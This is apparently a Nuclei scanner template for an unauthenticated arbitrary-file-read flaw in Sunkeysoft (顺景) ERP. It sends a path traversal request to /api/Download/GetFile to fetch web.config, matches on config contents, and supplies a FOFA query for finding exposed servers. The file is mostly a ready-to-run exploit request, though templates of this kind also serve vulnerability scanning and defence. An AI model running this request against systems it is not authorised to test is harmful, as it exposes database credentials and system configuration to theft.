id: sunkeysoft-GetFile-fileread
info:
  name: 顺景 ERP 系统 GetFile - fileread
  author: leadlife
  severity: high
  description: 顺景ERP是一款功能全面、高度集成、易于扩展的企业管理软件，能够帮助制造企业实现智能化、精益化管理，提升企业的竞争力和盈利能力。为企业提供全方位信息化的管理应用与支持，例如，在精密五金行业，系统可根据企业的业务流程及特性提供针对性信息化管理方案；在注塑行业，系统具有完整的水口料管理方案，对企业成本控制严谨到位；在电子行业，系统的BOM批量变更功能，能快速准确进行物料变更，并支持替代料功能等。顺景ERP Download/GetFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%A1%BA%E6%99%AFERP/%E9%A1%BA%E6%99%AFERP%E7%B3%BB%E7%BB%9FGetFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="/api/DBRecord/getDBRecords" || body="顺景软件 WebAPI 服务端"
    hunter-query: demo
  tags: fileread,sunkeysoft,erp

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/Download/GetFile?FileName=/../web.config&Title="
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml version','appSettings')
        condition: and